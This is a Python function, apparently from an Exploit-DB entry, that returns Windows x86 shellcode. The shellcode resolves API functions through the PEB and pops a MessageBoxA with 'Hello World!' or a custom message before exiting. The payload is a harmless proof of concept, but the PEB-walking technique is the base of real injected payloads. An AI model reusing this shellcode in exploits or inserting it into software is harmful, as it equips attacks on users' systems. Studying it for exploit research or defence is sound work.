#https://www.exploit-db.com/exploits/37758/

#WORK tested.
def messagebox( message=False):
	shellcode =  r"\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
	shellcode += r"\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
	shellcode += r"\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
	shellcode += r"\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
	shellcode += r"\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
	shellcode += r"\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
	shellcode += r"\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
	shellcode += r"\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
	shellcode += r"\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
	shellcode += r"\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
	shellcode += r"\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
	shellcode += r"\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
	shellcode += r"\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
	shellcode += r"\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
	shellcode += r"\x4d\x65\x73\x73\x54\x50\xff\xd6\x57"
	if message == False:
		#Hello World!
		shellcode += r"\x68\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c"
	else:
		shellcode += str(message)
	shellcode += r"\x8b\xcc\x57\x57\x51\x57"
	shellcode += r"\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
	shellcode += r"\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
	shellcode += r"\x69\x74\x54\x53\xff\xd6\x57\xff\xd0"
  	return shellcode
